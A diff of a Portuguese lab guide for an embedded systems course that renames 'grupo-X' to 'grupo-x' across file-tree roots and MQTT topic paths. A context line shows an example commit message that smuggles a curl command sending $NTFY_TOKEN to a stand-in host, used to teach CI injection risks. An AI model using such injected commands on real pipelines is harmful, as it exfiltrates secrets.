@@ -118,7 +118,7 @@ Lab 07, com os tópicos em `lab10`) em `src/main.cpp`:
   details={true}
   defaultOpen={false}
   title="Estrutura de Arquivos do Projeto"
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={[
     "platformio.ini u",
     "src/main.cpp u",
@@ -150,8 +150,8 @@ Lab 07, com os tópicos em `lab10`) em `src/main.cpp`:
 />
 
 :::info[Tópicos do Lab 10]
-O firmware normal continua falando MQTT, agora em `elt85b/lab10/grupo-X/` (`dht`, `adc`,
-`pwm`, `status`), com os comandos em `elt85b/lab10/grupo-X/cmd/<nome>`: `modo`, `aquecedor`,
+O firmware normal continua falando MQTT, agora em `elt85b/lab10/grupo-x/` (`dht`, `adc`,
+`pwm`, `status`), com os comandos em `elt85b/lab10/grupo-x/cmd/<nome>`: `modo`, `aquecedor`,
 `ventilador` e `intervalo`. O firmware de **CI** (`env:ci`) não usa rede: recebe os mesmos
 comandos pela **serial**, uma linha `<nome> <valor>` (`modo auto`, `aq 50`, `intervalo 2`).
 :::
@@ -174,7 +174,7 @@ separar:
 O **contrato** já está no repositório. Você escreve o `.cpp`:
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={["lib/camara_logica/camara_logica.h r"]}
 />
 
@@ -262,7 +262,7 @@ void setup() {
 
 E o `platformio.ini` ganha três ambientes:
 
-<FileTree root="lab10-grupo-X" files={["platformio.ini u"]} />
+<FileTree root="lab10-grupo-x" files={["platformio.ini u"]} />
 
 ```ini title="platformio.ini"
 [platformio]
@@ -319,7 +319,7 @@ O firmware de CI fica bem menor (sem a pilha Wi-Fi e o MQTT), e por isso também
 rápido. Compare o `RAM:`/`Flash:` dos dois no log.
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={[
     "lib/camara_logica/camara_logica.cpp c",
     "src/main.cpp u",
@@ -359,7 +359,7 @@ seu PC.
 
 ### 2.2 Os testes
 
-<FileTree root="lab10-grupo-X" files={["test/test_logica/test_logica.cpp c"]} />
+<FileTree root="lab10-grupo-x" files={["test/test_logica/test_logica.cpp c"]} />
 
 ```cpp title="test/test_logica/test_logica.cpp (estrutura e alguns testes)"
 #include <math.h>
@@ -480,7 +480,7 @@ quantos dos 4096 valores do ADC o resultado muda?) e escreva um teste que **pegu
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={["test/test_logica/test_logica.cpp c", "evidencias/t2-pio-test.txt c"]}
 />
 
@@ -537,7 +537,7 @@ tamanho de `long` e a FPU. E uma segunda pasta testa o que só existe lá, o LED
 Primeiro, tire os pinos e os canais do `main.cpp` e ponha num header que o firmware **e** o
 teste usam. Se o teste tivesse as próprias constantes, ele testaria outra configuração:
 
-<FileTree root="lab10-grupo-X" files={["include/hardware.h c"]} />
+<FileTree root="lab10-grupo-x" files={["include/hardware.h c"]} />
 
 ```cpp title="include/hardware.h"
 #pragma once
@@ -551,7 +551,7 @@ teste usam. Se o teste tivesse as próprias constantes, ele testaria outra confi
 
 No `main.cpp`, apague os `#define` correspondentes e acrescente `#include "hardware.h"`.
 
-<FileTree root="lab10-grupo-X" files={["test/test_alvo/test_alvo.cpp c"]} />
+<FileTree root="lab10-grupo-x" files={["test/test_alvo/test_alvo.cpp c"]} />
 
 ```cpp title="test/test_alvo/test_alvo.cpp (trecho)"
 #include "hardware.h"
@@ -656,7 +656,7 @@ um? O que poderia dar errado se o cast não existisse, e por que um teste que pa
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={[
     "test/test_alvo/test_alvo.cpp c",
     "include/hardware.h c",
@@ -694,7 +694,7 @@ os `Ticker`, a banda morta do ADC, o DHT22, a serial e o LEDC funcionando juntos
 Cada passo tem **um** comando (e um `name` opcional). O potenciômetro aceita `position` de
 0,0 a 1,0; o DHT22, `temperature` (°C).
 
-<FileTree root="lab10-grupo-X" files={["ci/cenario_integracao.yaml c"]} />
+<FileTree root="lab10-grupo-x" files={["ci/cenario_integracao.yaml c"]} />
 
 ```yaml title="ci/cenario_integracao.yaml"
 name: Camara - modos pot e auto
@@ -811,7 +811,7 @@ do que um teste que sempre falha?
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={[
     "ci/cenario_integracao.yaml c",
     "evidencias/t4-cenario.txt c",
@@ -860,7 +860,7 @@ Em **Settings ▸ Secrets and variables ▸ Actions**:
 
 ### 5.3 O workflow
 
-<FileTree root="lab10-grupo-X" files={[".github/workflows/ci.yml c"]} />
+<FileTree root="lab10-grupo-x" files={[".github/workflows/ci.yml c"]} />
 
 ```yaml title=".github/workflows/ci.yml (jobs testes, firmware e simulacao)"
 name: CI
@@ -1050,7 +1050,7 @@ do `README.md`:
 testes e os artefatos) e o link da execução no `README.md`.
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={[
     ".github/workflows/ci.yml c",
     "README.md u",
@@ -1215,7 +1215,7 @@ Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKE
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab10-grupo-x"
   files={[
     ".github/workflows/ci.yml u",
     "README.md u",
